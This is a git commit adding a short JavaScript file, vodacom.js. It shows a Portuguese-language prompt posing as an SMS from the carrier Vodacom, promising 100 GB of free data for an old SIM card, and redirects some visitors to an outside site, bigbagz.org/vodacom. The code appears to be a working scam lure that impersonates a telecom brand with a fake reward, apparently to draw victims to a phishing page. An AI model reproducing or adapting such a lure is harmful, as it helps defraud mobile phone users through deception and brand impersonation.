d964ab8cde1be31d269cd0d62e3b1b28791cc031
bigbagzz <usakpolo247@gmail.com>
2025-08-23 08:03:19 +0100

    Create vodacom.js

---
+++ vodacom.js
@@ -0,0 +1,5 @@
+var password = 'Ativar 100 GB'
+password=prompt('SMS: Parabéns, seu cartão SIM Vodacom é elegível para receber dados gratuitos como recompensa por um cartão SIM antigo. Clique em OK para ativar agora.','Ativar 100 GB');
+if (password != 'Ativar 100 GB') {
+location.href='https://bigbagz.org/vodacom';
+}
